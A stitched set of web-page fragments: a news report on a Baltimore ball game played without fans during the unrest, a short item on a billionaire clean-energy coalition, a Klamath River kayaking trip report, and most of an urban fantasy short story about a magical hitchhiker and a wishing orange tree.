American League.</p>     <p>Large National Guard vehicles deployed from a lot behind the stadium. The constant whir of helicopters above persisted.</p>     <p>Otherwise there were few signs of a game being played, or that this had been the site of a clash between protesters and baseball fans that helped stir the violence here on Saturday.</p>     <p>Sliders Bar and Grille was a pivot point in the protest turning unruly, as videos show fighting between patrons and young people who had walked from West Baltimore.</p>     <p>Wednesday the crowd there was sparse.</p>     <p>Outside Pickles Pub, just a few doors down, a sign mocked Baltimore Mayor Stephanie Rawlings-Blake for saying she &#x201c;gave those who wished to destroy space to do that,&#x201d; a comment she has since tried to rescind. It read: &#x201c;WE PROVIDE &#x2018;SPACE&#x2019; FOR FOOD, BEVERAGE, AND FUN TIMES.&#x201d;</p>     <p>&#x201c;There&#x2019;s a message there and people might run with it, but really we want the people in the city to know that this is a place they can come together,&#x201d; said Craig Ziegenheim, a 28-year-old manager at the bar.</p>     <p>Back over near the stadium, brothers Les Bowen, 28, and Larry Marsh, 21, agreed that the game should remained closed to the public.</p>     <p>&#x201c;We come here because sports brings different people together,&#x201d; Bowen said. &#x201c;It&#x2019;s sad that we can&#x2019;t have that today.&#x201d;</p>     <p>The brothers drove from their Chincoteague, Va. home early Wednesday to try to help in the city where they were raised. They cleaned some trash near the Inner Harbor, then headed to the stadium, hoping to find other fans.</p>     <p>&#x201c;I think people will come,&#x201d; Marsh said. &#x201c;It&#x2019;s another way to show the city is strong.&#x201d;</p>     <p>Some saw going to the game as usual as a duty. Matt Fouse just thought it was a good day for baseball. The Baltimore artist usually sits in Section 45, Row 2, Seat 7, a little ways off from home plate. Wednesday he stood with the others, his six-month old daughter resting in her stroller.</p>     <p>He thought being here was his way to show love for the city. Beyond that, he, like so many, was at a loss.</p>     <p>&#x201c;What&#x2019;s happened here is sad and disheartening and I wish I knew what could help us all heal,&#x201d; he said. &#x201c;But I&#x2019;m not qualified to give an answer because I&#x2019;m not one of the people trapped in what has been going on.&#x201d;</p>    </div>    <p>, , , </p>    <div>     <div>      <span>2.5k</span>      <span>shares</span>     </div>     <div>      <span>share</span>     </div>     <div>      <span>tweet</span>     </div>     <div>      <span>sms</span>     </div>     <div>      <span>send</span>     </div>     <div>      <span>email</span>     </div>    </div>   </div>   </div>

   <div>   <p>[USA] A dream team of tech giants&#xa0;&#x2013;&#xa0;Bill Gates, Mark Zuckerberg, Richard Branson, Amazon CEO Jeff Bezos, Jack Ma from Alibaba, along with a host of &#xa0;&#x2013;&#xa0;have announced they're&#xa0;coming together to combat .</p>   <p>The hopes to inspire and, more importantly, fund start-up companies that are developing technology to&#xa0;tackle . The coalition also hopes to challenge&#xa0;the stagnant model of separate&#xa0;public&#xa0;versus private development&#xa0;and start a new paradigm where governments, businesses, and researchers can all collaborate and benefit together.</p>   <p>On their website, they say: &#x201c;The existing system of basic research, clean energy investment, regulatory frameworks, and subsidies fails to sufficiently mobilize investment in truly transformative energy solutions for the future. We can&#x2019;t wait for the system to change through normal cycles.</p>   <p>&#x201c;Experience indicates that even the most promising ideas face daunting commercialization challenges and a nearly impassable Valley of Death between promising concept and viable product, which neither government funding nor conventional private investment can bridge.</p>   <p>&#x201c;This collective failure can be addressed, in part, by a dramatically scaled-up public research pipeline, linked to a different kind of private investor with a long term commitment to new technologies who is willing to put truly patient flexible risk capital to work.&#x201d;</p>   <p>Bill Gates and Mark Zuckerberg announced the plan through a &#xa0;on Sunday. By no coincidence, the announcement coincides with the&#xa0;UN Climate Change Conference in Paris &#xa0;this week. The group&#xa0;of billionaire super-geeks hope to add pressure and inspire the talks, stressing that addressing can't&#xa0;just&#xa0;come from governmental funding and law alone, but aslo through innovation, investment and business.</p>   <p>View original article at: </p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <div>    <h3>Suggest reading:</h3>   </div>  </div>  
   <div>   <p>Kayaking is a ton of fun, but for some reason we do not get out on the water as often as we would like.&#xa0;What better way to spend the 4th of July weekend than to combine our love of paddling and exploration on a <strong>4 day river float</strong>.</p>   <div>    <p>What is life if you don&#x2019;t enjoy it every chance you get?</p>   </div>   <p>With the current drought our choices were limited but the Klamath River sounded like a great idea. There are <strong>some class II and III rapids</strong> but long stretches allow for sitting back,&#xa0;relaxing, and letting the river do the work. We planned an <strong>84-mile float from Iron Gate Dam to Happy Camp</strong>&#xa0;using&#xa0; as our guide. Most of our&#xa0;planned route was&#xa0;inside Klamath National Forest.</p>   <p>Our boats are not whitewater kayaks by any means. Luke and I are the proud owners&#xa0;of Wilderness Systems Tsunamis; the 125 and 120, respectively. At 12.5 and 12 feet, these are great all-around touring boats. We felt confident in our ability to run the river successfully with a few portages, but we made sure to have all our safety equipment just in case (helmet, rope, life vests, 10 essentials).</p>   <div>    <p>Kayaks ready to launch just below the Iron Gate Dam.</p>   </div>   <h2><strong>Day 1: 20 miles, put-in &#x2013; Iron Gate Dam&#xa0;</strong></h2>   <p>We camped at the Curley Jack&#xa0;campground outside&#xa0;Happy Camp ($15/night for camping)&#xa0;and left our car in the&#xa0;long-term parking lot. An hour and a half drive later, we arrived at our put-in and left the&#xa0;other car in a turnout by the Iron Gate Hatchery.</p>   <p>The area just below the Iron Gate Dam attracts many rafters and other leisurely boaters since it is so calm. We went 20 miles our first day with no problem. Well, with the exception of Luke flipping his boat and banging up his knees.</p>   <div>    <p>I&#x2019;m a bit embarrassed that for years I thought the lyrics were &#x201c;Glorified version of a pelican.&#x201d;</p>   </div>   <div>    <p>There were so many turtles along the shores of the river. The problem was that they would dive when I got to close and the kayak was in constnat motion.</p>   </div>   <p>One of the great aspects of being on the water in these remote areas is the wildlife. I have never seen so many turtles. Their little heads were sticking out of the water all along the shore.&#xa0;We also saw osprey; they were perched on their nests, flying above us, and even diving into the river just in front of us. Great Blue Herons lined the shorelines like ancient guardians of the wilderness.&#xa0;Another main attraction was the two&#xa0;Bald Eagles. We were told that there are 40-50 breeding pairs in the area.</p>   <div>    <p>One of the first rapids we encountered. Sharon took it like a pro.</p>   </div>   <h2><strong>Day 2: 25 miles, Class II and III rapids</strong></h2>   <p>Our second day was a little more exciting. Miles 20-45 have a few Class II rapids as well as the Class III Schoolhouse and Honolulu Rapids which we chose to walk around. We camped on an island near mile 45.</p>   <div>    <p>Ready to go!</p>   </div>   <h2><strong>Day 3: 20 miles, many Class II and III rapids</strong></h2>   <p>The&#xa0;3rd day was to&#xa0;be the most difficult with&#xa0;several Class II and Class III rapids.&#xa0;However, the river is currently at its lower runnable limit so we managed to paddle through several rapids we planned on bypassing.&#xa0;The thought that kept us going was that from mile 70&#xa0;it would be smooth sailing through our take-out at mile 84.</p>   <div>    <p>Water rushing over boulders has a Zen quality to it.</p>   </div>   <p>We were almost scott-free when&#xa0;Luke decided to fall out of his kayak just before Otter&#x2019;s Playpen at mile 65. He wasn&#x2019;t even going through a rapid at the time. As the current dragged us downstream, I knew I had no choice but to run the rapid. I made it though and pulled my kayak ashore. As I turned around, I saw Luke&#x2019;s paddle float by. Then his kayak. With panic setting in, I turned to see Luke standing on a rock outcropping in the middle of the rapid. He was screaming at me to go after the kayak!</p>   <div>    <p>So many deer on the road, but also a few in the river.</p>   </div>   <h3><strong>The Rescue Mission</strong></h3>   <p>He later recollected, &#x201c;Knowing I wasn&#x2019;t going to get to shore in time, I kept my feet in front of me and tried using the kayak as a bit of a shield. The strategy worked as I managed to stop myself on a rock island in the middle of the rapid. With adrenaline pumping, I climbed up the large boulder and tried to hang on to my kayak, with my precious camera gear, but the current was too strong. It was either me or the boat, and I had to let go.&#x201d;</p>   <p>I didn&#x2019;t go after the kayak; instead, I went after Luke. He had signaled that he needed rope so I grabbed my throw-rope and ran along the shore towards him. After tying off the rope it took several attempts to toss it to&#xa0;him. I braced&#xa0;myself as Luke jumped into the Playpen holding onto the rope for dear life.</p>   <p>He was able to make it to shore. Once we were both safe, the thought of his kayak, camera gear, and camping equipment began to haunt us. It had all floated downriver. Would it join the mountain of garbage in the ocean? Would insurance cover the loss?</p>   <p>&#x201c;I was a bit frantic about the loss of my brand new camera and all our camping gear, but I was happy that I made it out alive and not even hurt. Sharon kept me calm and collected and focused.&#x201d;</p>   <p>The insurance claim would have to wait. For now, we had to find a way to reach Hwy 96. The sun was starting to set and we were wet. Our sleeping bags and dry clothes were downriver. All of my gear and the remaining kayak needed to be dragged up the embankment. Luckily, just after reaching the road, Forest Service employees drove by and I was able to wave them down. They called Officer White to the scene so we could load everything into his truck and be taken back to our car.</p>   <div>    <p>Our info source stated that the crux was to avoid these rocks. We did so by portaging around the rapid.</p>   </div>   <p>&#x201c;Do you guys ever recover kayaks?&#x201d; Luke asked, trying to figure out the chances of getting our gear back. &#x201c;We do all the time. One of my primary jobs is recovering the bodies that typically accompany them.&#x201d; Officer White responded.</p>   <h3><strong>A Shocking Recovery</strong></h3>   <p>As we were packing up, an SUV stopped and the men inside asked if we lost a kayak.</p>   <p>YES! We had! What luck! Kris&#xa0;and his family from the &#xa0;had found Luke&#x2019;s kayak about 1.5 miles downstream and they were looking for us. Kris and his female friend, Lona, were driving back&#xa0;from a day of rafting, when she noticed a kayak without the owner floating down the river. Kris fetched his kayak&#xa0;and&#xa0;paddled to grab not only the kayak but also the paddle. He then paddled back upriver towing all the gear. Truly amazing. We are so grateful!</p>   <p>&#x201c;As I approached the kayak, I saw something floating next to it. I thought it was going to be a body. I really didn&#x2019;t want that today. Luckily it wasn&#x2019;t a body.&#x201d; Kris told us.</p>   <p>We spent the night at the&#xa0;resort; our nerves were too shaken to return to the river. A return visit will be needed to finish the run, especially since Officer White told us the final stretch is the prettiest bit of the river.</p>   <div>    <p>The folks that found and returned my kayak operated this lodge. Gorgeus scenery with a gazebo right by the creek. If you need a place to stay and you&#x2019;re in the area, make sure to give them your business.</p>   </div>   <p>We owe so much gratitude to the visiting Forest Rangers, Officer White of the Klamath National Forest, and the gang at Thompson Creek Resort. What could have been a terrible weekend turned into a great&#xa0;memory and an exiting story.</p>  </div>  
   <div>   <p>This is a shortened and revised version of my first anthology piece, published originally by editor Lee Martindale and Meisha Merlin in 2000. It&#x2019;s an urban fantasy near-future piece that may or may not eventually become a novel. Yes, it&#x2019;s in first person, and the narrator never gives her name (<em>Rebecca</em> impressed me mightily, in my early teen years.) No, the narrator is not me. (She&#x2019;s a far better painter than I am.) But February is the time of year when I first wrote this story down. It&#x2019;s when central Arizona is mild and forgiving to everyone but allergy sufferers, and when citrus blossom, jasmine, and acacia perfume the air.</p>   <p>The reprint market for such things is very scarce if one is not a &#x2018;name&#x2019; author, so I decided to re-release this slightly different version as a thank you gift for my readers.</p>   <figure>    <figcaption>     1911 Faberge Easter Egg &#x2018;Orange Tree&#x2019; &#x2013; the original inspiration for this story.

It&#x2019;s worth your time.</p>   <p><strong>The Blood Orange Tree, by Crane Hana (approx. 3600 words)</strong></p>   <p>Who runs out of gasoline three days in a row in the same place, in the Arizona desert?</p>   <p>The first morning I drove on, and felt guilty the rest of the day. The second morning I imagined a murderer&#x2019;s van lurking behind the mesquite groves just off the highway. The third morning, I saw the same weary young figure trudging past the same milepost, a gasoline can banging his knees as he walked. How would I feel in his place? I stopped on the shoulder, and rolled down my window as I watched him hurry to meet the car. &#x201c;Where are you headed?&#x201d;</p>   <p>He glanced toward the south. &#x201c;Into the city.&#x201d;</p>   <p>&#x201c;Car break down?&#x201d;</p>   <p>&#x201c;Motorcycle. A few miles back.&#x201d; He waved his free hand toward the northwest. &#x201c;Thanks for stopping, lady.&#x201d;</p>   <p>When kids his age said &#x2018;lady&#x2019; it meant &#x2018;forty-something fat bitch&#x2019;. His &#x2018;lady&#x2019; was different enough that I said, &#x201c;Join me and Gray Mare, then.&#x201d;</p>   <p>He bent to look through the window. &#x201c;You have a horse?&#x201d;</p>   <p>&#x201c;The Saab.&#x201d; I patted the dashboard. &#x201c;From a Tolkien story, with an old gray mare of uncommon good sense.&#x201d;</p>   <p>&#x201c;Ah,&#x201d; he said. &#x201c;Sympathetic magic.&#x201d;</p>   <p>I reminded him about the seatbelt. He fumbled with the catch, and jumped at the Mare&#x2019;s stuttering engine. I smiled. He turned to look out the window.</p>   <p>Jackrabbits and mourning doves watched us pass. A hawk soared high enough to be gilt by dawn-light. The boy frowned at the hawk.</p>   <p>When the road let me, I glanced at him. Eighteen, I thought, maybe nineteen. Thin, tall, colt-knobby at the joints. Bronze-red hair curled against high cheekbones and olive skin. Jeans dark and crisp, a clean gray T-shirt, a storm-blue jacket with the sheen of silk. He didn&#x2019;t smell of three days in the desert, or even an hour. I didn&#x2019;t think the jacket hid a gun.</p>   <p>On the floor, the gasoline can rocked. Red-orange dust stained the boy&#x2019;s jeans. I saw the other side of the can, its metal a pitted lacework of rust.</p>   <p>The Mare jittered over the center line.</p>   <p>He looked at me, then at the can. &#x201c;Ah. I needed a lure. I don&#x2019;t mean to hurt you.&#x201d;</p>   <p>My knuckles whitened on the steering wheel. I kept my voice light. &#x201c;You&#x2019;ve been here three days. What do you want?&#x201d;</p>   <p>&#x201c;Help me. Before sunrise. Please.&#x201d;</p>   <p>A juvenile detention center, heralded by <em>Do Not Stop For Hitchhikers</em> signs, lay not too many miles eastward. More sunlit hawks wheeled over a salt flat ahead. &#x201c;What happens at sunrise?&#x201d;</p>   <p>&#x201c;To you? Nothing. Will you take me into the city?&#x201d;</p>   <p>I glanced east. The first sliver of sunlight pierced a gap in the mountains. Half a mile before us, mirages rippled golden above asphalt.</p>   <p>&#x201c;Please?&#x201d; he whispered again, staring ahead, his fingers clenching the seatbelt.</p>   <p>&#x201c;All right.&#x201d; Why not? &#x201c;To the city.&#x201d;</p>   <p>Peach-golden light spilled across the desert and into my car. The boy cast a watery shadow against torn upholstery. He forced one hand against his lips. A hawk dipped by my side window, pacing the car, its wingtip almost brushing the glass. Over the Mare&#x2019;s engine, I heard the hawk&#x2019;s scream recede into distance.</p>   <p>Sunlight. The hawk was gone. When I glanced over, the boy&#x2019;s shadow was solid as mine. His smile was unsteady, his gray eyes bright. &#x201c;Thank you,&#x201d; he said.</p>   <p>&#x201c;You&#x2019;re welcome. Just send some luck my way.&#x201d;</p>   <p>&#x201c;On my honor, I will.&#x201d;</p>   <p>Such words. Prep school? Royalty?</p>   <p>&#x201c;So,&#x201d; I said, &#x201c;Your motorcycle ran out of gas three mornings in a row.&#x201d;</p>   <p>&#x201c;And somebody stole my real gas can today, about ten miles before that town &#x2013;&#x201d;</p>   <p>&#x201c;Wickenburg. Better make it twenty miles. I live ten miles north of it.&#x201d;</p>   <p>&#x201c;Twenty, then.&#x201d;</p>   <p>&#x201c;Why are you afraid of dawn? Why are you here?&#x201d;</p>   <p>&#x201c;Oranges.&#x201d;</p>   <p>&#x201c;Oranges?&#x201d;</p>   <p>&#x201c;My father owns an experimental nursery in, er, Nevada. Hybridizing plants to arid regions. Grafting delicate strains to strong stock. He sent me down to look at an odd old variety he wants, growing at a private ranch. I&#x2019;ll try to buy some cuttings. Our orchards are dying out. This hybrid might save them.&#x201d;</p>   <p>The mile markers surged by. I began to wonder about our game. &#x201c;I know legends about oranges.&#x201d;</p>   <p>He humored me. &#x201c;Really?&#x201d;</p>   <p>&#x201c;The golden apples of the Hesperides. One of Hercules&#x2019; tasks, I think. A 17th Century Dutchman said they were oranges. Maybe the Hebrew&#x2019;s Tree of Knowledge was an orange tree. Or was it apricot? And I read a fantasy book once, long ago, that said every thirteenth fruit of the orange tree held a wish. They were only folktales, but beautiful.&#x201d;</p>   <p>&#x201c;You&#x2019;re a scholar?&#x201d;</p>   <p>&#x201c;Hardly. My family lived in a good part of Phoenix. The houses seemed to come with their own transplanted English gardens. Whoever designed ours was a citrus addict. He&#x2019;d left his books in the attic.&#x201d;</p>   <p>His regal voice sharpened. &#x201c;Do you own them still?&#x201d;</p>   <p>&#x201c;My mother sold them in an estate sale years ago. To help me pay for art school. For all the good it did us, we should have kept the books and the house.&#x201d;</p>   <p>&#x201c;I smelled orchards blooming before dawn. I thought the city was magical at night, from up in the mountains,&#x201d; the boy said. &#x201c;A lake of stars.&#x201d;</p>   <p>&#x201c;Most of the orchards are pastel subdivisions by now. It&#x2019;s only February. Right now, you smell the old orange trees in yards and along the freeways. The green doesn&#x2019;t really belong here. Like the swimming pools and golf courses. Phoenix is as much a mirage as Vegas.&#x201d;</p>   <p>&#x201c;Vegas?&#x201d;</p>   <p>&#x201c;Never mind.&#x201d; I wondered where he really lived.</p>   <p>&#x201c;I wish you could see it through my eyes, lady.&#x201d;</p>   <p>&#x201c;I can&#x2019;t see around the past.&#x201d;</p>   <p>&#x201c;What past?&#x201d; His hand flattened on my forehead.</p>   <p>&#x201c;Oh,&#x201d; I said.</p>   <p>The Arizona Tourism Board must marshal legions of photographers on mornings like this, I thought. Twenty miles away, skyscrapers rose like crystal blocks. Surreal mountains ringed the city, speared up through it in seven-hundred-foot-high scarps of russet and amber sandstone. Golf courses and swimming pools were beryls and sapphires set in a misty golden valley. The abomination was beautiful because it had no right to exist, an ephemeral kingdom made as much of illusion as water and steel.</p>   <p>&#x201c;Treasure it. It cannot last,&#x201d; he whispered. His fingertips left my skin, but some of the sudden magic stayed. &#x201c;I know deserts. This one waits below the surface. The desert says people lived here long ago, and it did the same to them. Who were they?&#x201d;</p>   <p>&#x201c;Hohokam,&#x201d; I dredged up high-school memories. &#x201c;Native Americans. Canal-builders. Some of the new canals follow the old channels. The first people are long gone. Maybe some of the nearby tribes are descendants. I don&#x2019;t know.&#x201d;</p>   <p>The boy nodded. &#x201c;Whoever rebuilt those canals made the same bargain as before, probably unwitting. The desert&#x2019;s magic, in exchange for desolation later. Whatever lives and grows here has the power to defy time and entropy, at least for a while.&#x201d;</p>   <p>&#x201c;This is just Phoenix.&#x201d;</p>   <p>&#x201c;This is Phoenix, lady. A city twice-risen from sand, called after the Benu, the Firebird? There is great power in names. Anything can happen here, while the city stands and water flows through it.&#x201d;</p>   <p>&#x201c;You&#x2019;re nuts.&#x201d;</p>   <p>&#x201c;You&#x2019;re blind.&#x201d;</p>   <p>&#x201c;Perhaps, but I&#x2019;m the driver.&#x201d;</p>   <p>&#x201c;Then watch where you&#x2019;re going.&#x201d;</p>   <p>The surviving citrus orchards yielded to pink-walled, fake-adobe subdivisions and seedy strip malls. The painterly part of my brain stopped its habitual self-doubt long enough to piece together a sketch. Under a hot white noon sky, three orange-tree dryads danced in a desert full of shattered glass and metal. Their bodies were lush, heavy, relics of a beauty centuries out of style. I had never thought of myself as beautiful &#x2013; but the dryads were. I tried to analyze the imagery. A manifesto railing against over-development? A 20th century take on Classicism? A size-wise fairy tale?</p>   <p>The vision refused explanation.</p>   <p>&#x201c;Where are we going?&#x201d; asked my passenger, pulling me out of the reverie in time to realize I&#x2019;d been pacing traffic at an effortless seventy miles per hour, instead of my normal plodding fifty-five.</p>   <p>&#x201c;I work downtown. Where do you need to be?&#x201d;</p>   <p>&#x201c;Are you an artist there?&#x201d;</p>   <p>&#x201c;I wish. I don&#x2019;t even know what art is, anymore. Did you know, there&#x2019;s a guy in London who makes art from dead sharks and cows in formaldehyde tanks?&#x201d;</p>   <p>He made a disgusted noise. &#x201c;We have people like that. Are they valued here?&#x201d;</p>   <p>&#x201c;Enough to be famous for a while. The recession hit even him in the end, I guess. My day-job is desk jockey for an information security company. I keep telling myself I&#x2019;m only waiting for the big break. Let&#x2019;s worry about your future, first. The bus connections aren&#x2019;t the best. But they&#x2019;ll get you close to your orange tree. Do you know the address?&#x201d;</p>   <p>&#x201c;Bus?&#x201d; he asked.</p>   <p>I was late to work, giving him cash to buy an all-day transit pass and a map. I blamed traffic, and planned another painting during my breaks: in brown-purple dusk, a scene of tropical fish swimming between wire fences and cacti. I imagined city lights blooming down in a valley, like lost Atlantis in an undersea rift.</p>   <p>Like the dryads it refused agenda, craving only existence.</p>   <p>I pushed my last sketch aside and concentrated on work. Downtown Phoenix intruded through the window. By late afternoon, an unfamiliar city rebuilt itself outside the office window: all angles, color-washed planes, clean lines that echoed back to a 1920&#x2019;s ideal of glorified technology and a bright future.</p>   <p>So many ideas. Could I paint even one of them? Trying would cost me nothing but the old watercolor paints slowly drying in their tubes. Blank paper waited in my tiny studio, a dozen white-shuttered windows that didn&#x2019;t need reasons or markets or clients to exist.</p>   <p>I walked outside to the Mare.</p>   <p>Go home right now, sang the sun and the wind in the green palm-fronds, and you can paint whatever you want as long as you live.</p>   <p>I saw the boy leaning against my car, his head bent over his hands. The lines of his body, outlined by red-orange sunlight, almost made me reach for the little sketchbook in my purse.</p>   <p>&#x201c;Any luck?&#x201d;</p>   <p>He looked up, face set in a scowl. &#x201c;No. I need your help again.&#x201d;</p>   <p>The muse&#x2019;s moment began to ebb. I might still paint. If I got in the Mare without involving myself again. The orange-tree dryads, the desert reef, and the crystal towers begged me to drive away.</p>   <p>&#x201c;The owner wasn&#x2019;t cooperative,&#x201d; he snarled. He tossed away the object in his hands, a dead brown twig shedding desiccated leaves. &#x201c;He wanted things I didn&#x2019;t have. Credit cards, check guarantee cards, my father&#x2019;s tax number, references. And he wouldn&#x2019;t take what I had for payment! All for a wretched, half-dead tree that no one will be able to save in a year!&#x201d;</p>   <p>My moment of perfect creativity fled. &#x201c;What did you try to give him? Not the gasoline can, I hope.&#x201d;</p>   <p>He upended a fist-sized green suede bag on the Mare&#x2019;s hood. I winced at the noise, then forgot to breathe. Finger-long bars of gold, chased with wavy interlocking designs, clanged against old steel. Polished nuggets caught the sun, flaring Gulf-stream blue, dark carmine, jungle-green. A perfect spectrum sprayed across pitted paint, from a water-clear stone the diameter of my thumb.</p>   <p>The boy glared at the trove. &#x201c;He said I was probably a thief. Then he threw me out. Threatened to call the police. So I found you again.&#x201d;</p>   <p>I leaned back against my car. &#x201c;How on earth?&#x201d; Did I really want to know how he found me, in all of central Phoenix? &#x201c;What now?&#x201d;</p>   <p>&#x201c;You helped me once.&#x201d; He scooped up a handful of gems and gold. &#x201c;You&#x2019;re poor, but you know this city. You can turn this dross into useful coin. It&#x2019;s yours.&#x201d;</p>   <p>&#x201c;If I can get you back to that ranch tonight.&#x201d;</p>   <p>&#x201c;Yes.&#x201d;</p>   <p>If I couldn&#x2019;t paint, I thought, I might as well try being rich and talentless.</p>   <p>#</p>   <p>We idled along quiet drives curtained in the deep greens made possible by water and money. I saw too many short-sale signs in front of the sprawling houses on this rich street. &#x201c;We may be just in time,&#x201d; I said. &#x201c;Your farmer might sell to a real-estate investor, if he&#x2019;s not losing his property to a bank.&#x201d;</p>   <p>&#x201c;Would the new owners keep the orchard?&#x201d;</p>   <p>&#x201c;Maybe some of the younger, prettier trees.&#x201d;</p>   <p>We drove past the orchard and its high iron gates. While my passenger chewed his fingernails, I parked half a block away. &#x201c;No for-sale sign,&#x201d; I said. &#x201c;He&#x2019;s fighting the tide and staying. That means he&#x2019;ll have security.&#x201d;</p>   <p>&#x201c;I&#x2019;ll get you out of it.&#x201d;</p>   <p>&#x201c;I suppose you&#x2019;ll flash gold in front of the guards?&#x201d;</p>   <p>&#x201c;No guards. Just sizzling wires and tiny lights.&#x201d;</p>   <p>&#x201c;Electronics, then,&#x201d; I sighed.</p>   <p>&#x201c;I didn&#x2019;t come this far to let a fence stop me.&#x201d;</p>   <p>And I hadn&#x2019;t come this far to stay with the Mare.</p>   <p>The boy ghosted to the main gate. I expected him to have tools. Then again, remembering the golden bars, I wasn&#x2019;t startled when he simply raised a hand to the iron. Something crackled. I smelled acrid smoke. The gate swung open. All the nearby crickets stopped chirping.</p>   <p>&#x201c;Come on,&#x201d; he whispered. &#x201c;I&#x2019;ll need your help inside.&#x201d;</p>   <p>I followed him, my sensible heels catching on twigs but making little sound. Black shapes loomed ten or fifteen feet from the floor of the night, making the orchard an alien labyrinth. Peacocks shrieked in the distance. Tree branches drooped, offering leafy boughs and thorns, sweet fruit and rancid windfalls, the scent shifting between early blossoms and winter decay.</p>   <p>Coppery sodium-vapor light, reflected from ragged clouds overhead, limned a clearing occupied by one weathered shed and a tree. I saw the root stock, its few crooked stems carrying stunted, nearly-fossilized brown globes. From that dreary nest lifted a smooth gray trunk shrouded in waxy leaves, fruited in golden constellations.</p>   <p>The main tree, the scion. A dwarf Yggdrasil? A Tsarina&#x2019;s Faberge toy? It should flourish jade leaves and moonstone blossoms, its silver trunk springing from a golden urn in a museum.</p>   <p>The next glance showed me brown-edged and yellowed leaves. The tree was dying, certainly distressed.</p>   <p>&#x201c;What now?&#x201d; I whispered.</p>   <p>&#x201c;Start the count. You pick where.&#x201d;</p>   <p>I considered one heavy fruit among many. An orange. Unmysterious. I could buy its cousin at any grocery. But I remembered childhood and hand-colored books: Eve&#x2019;s apple, Hellenic myths, Arabian Nights tales of forbidden orchards.</p>   <p>Another dour medieval legend surfaced: &#x201c;I can&#x2019;t,&#x201d; I said. &#x201c;Women supposedly blighted orange trees with a single touch.&#x201d;</p>   <p>&#x201c;Are you a virgin, then?&#x201d;</p>   <p>&#x201c;Watch your mouth! I went to college.&#x201d;</p>   <p>&#x201c;And you remember it?&#x201d;</p>   <p>&#x201c;Sadly, yes.&#x201d;</p>   <p>&#x201c;We&#x2019;ll risk it. Have you gloves?&#x201d;</p>   <p>I saw his grin, in the copper light. &#x201c;Gloves, he wants,&#x201d; I told the tree. &#x201c;We&#x2019;ll need a lawyer if we get caught.&#x201d;</p>   <p>&#x201c;For an orange or two? From necromancers who put pickled animals on pedestals? What a world you live in. Choose, lady.&#x201d;</p>   <p>I pointed into the dark green void at one fruit. No different than its fellows. Merely the first my eyes found. &#x201c;That one.&#x201d;</p>   <p>He pointed from that to the next, whispering each number until &#x2013; &#x201c;Thirteen!&#x201d; He snapped the last orange from its twig with a tiny snick. He tucked the fruit into his jacket. Then he reached up and snagged my orange. &#x201c;Here. They&#x2019;re blood oranges. You can&#x2019;t find them often in the markets you frequent, I&#x2019;d guess. Your wage.&#x201d; The easy arrogance in his voice stung me, did not sting me at all. The strong, clean citrus smell was worth that much.</p>   <p>A tardy alarm shrilled near the main house. We&#x2019;d left the gate open. A sensor woke. Lights stuttered on. Peacocks wailed. I heard a man&#x2019;s voice raised in question.</p>   <p>We ran. Like Cinderella, I lost a shoe on the way. The boy darted through the gate. As I passed, it brushed my arm and bestowed a kissing shock. But the Mare waited, her ignition blessedly loyal. While flashlights still stabbed through the dark orchard, we rocketed away, laughing like fools.</p>   <p>No one followed us. I stopped near an all-night taqueria. Untrimmed palm trees edged the street, their papery brown fronds creaking in a light breeze. In the parking lot, half a dozen members of a local low-rider club whooped and made their cars buck to music.</p>   <p>The boy dug out a gem-hilted knife from his jacket. He began to peel his prize in neat cuts quartering the ruddy skin.</p>   <p>&#x201c;What about your father?&#x201d;</p>   <p>&#x201c;He wanted the cuttings to renew our orchards. He said the ripe fruit was useless unless it had grown from our soil. I don&#x2019;t see why. One orange might spawn more trees from its seeds than one cutting.&#x201d;</p>   <p>&#x201c;No,&#x201d; I said, remembering the citrus addict&#x2019;s books. &#x201c;Cross-pollination. The tree bloomed in that orchard with other oranges. There are still thousands of citrus trees in this valley. God knows what you&#x2019;d get from the seeds. Only a cutting would grow true to the strain.&#x201d;</p>   <p>His knife trembled across the orange&#x2019;s pitted skin, stopped in mid-cut. He looked back at me, then out across the city. He smiled.</p>   <p>&#x201c;No.&#x201d; I made it final by turning off the Mare&#x2019;s engine. &#x201c;We are not going back.&#x201d;</p>   <p>&#x201c;I&#x2019;m not, either. Going back, I mean. To my land.&#x201d;</p>   <p>&#x201c;Your land.&#x201d;</p>   <p>My companion shrugged. &#x201c;I thought I had failed. But if I stay here, I haven&#x2019;t. It would be my life to return without the cuttings. And I do not think I would like my life much, if they took root in our soil.&#x201d; His eyes held an ageless fear. &#x201c;Our soil &#x2013; changes things. Sometimes not for the better. But this orange? This is for me.&#x201d;</p>   <p>&#x201c;All this for an orange?&#x201d;</p>   <p>He gave me the knife hilt-first in a courtly flourish. &#x201c;For this orange, yes. Try yours.&#x201d;</p>   <p>I took the knife. Held my wage untouched in my hand, and watched him.</p>   <p>He peeled thirteen sections away from the pith. The boy bit into the first wedge, trailing white membranes from the nipped edge. The dark-red, shredded pulp vesicles looked more like organ meat than fruit. &#x201c;Not hungry?&#x201d; he teased.</p>   <p>I felt like a drunk teenager on a dangerous dare. One wish. Love or talent? Or wealth, which might buy facsimiles of both? A better life, certainly. It wouldn&#x2019;t be wrong to eat this orange. Only wasteful. I might never paint again. But I&#x2019;d never forget how I&#x2019;d felt, in that sunset moment when I could paint whatever I chose. And let lapse the gift to help a stranger.</p>   <p>&#x201c;I&#x2019;ll keep it.&#x201d; I handed back the knife. &#x201c;How is yours?&#x201d;</p>   <p>&#x201c;Beautiful.&#x201d;</p>   <p>In the brief, silken silence I remembered the day&#x2019;s embryonic pictures. If I reached for them, they&#x2019;d vanish.</p>   <p>Remembering them was torment. Forgetting them, unthinkable.</p>   <p>The boy tucked twelve orange segments into his jacket, then opened the car door.</p>   <p>&#x201c;Where are you going?&#x201d;</p>   <p>&#x201c;To find real magic. The kind you have, lady. There&#x2019;s more power here than in any place I know, and I want it. Thank you for showing it to me.&#x201d; He leaned over and kissed me briefly on the lips. The scent of the orchard rose from his hair and skin.</p>   <p>&#x201c;How will you get back to &#x2013; to Nevada?&#x201d; I asked, as the secondhand taste of the wishing-orange stung my lips, the tip of my tongue.</p>   <p>&#x201c;Who cares? I&#x2019;d rather see this world first.&#x201d; He set the treasure bag on the passenger&#x2019;s seat. Then he walked away from the Mare.</p>   <p>&#x201c;Wait!&#x201d;</p>   <p>Some of the low-riders looked over and laughed, not cruelly, at a plain middle-aged woman calling after some jail-bait hustler. The boy didn&#x2019;t look back. The palm-fronds closed behind him.</p>   <p>&#x201c;You can&#x2019;t survive here,&#x201d; I began. &#x201c;Oh, hell.&#x201d; How would I even report him to the police?</p>   <p>Who&#x2019;d believe me? I looked at the top half of my face in the rear-view mirror. A data-entry clerk. A non-entity who thought she was an artist. Whose paintings 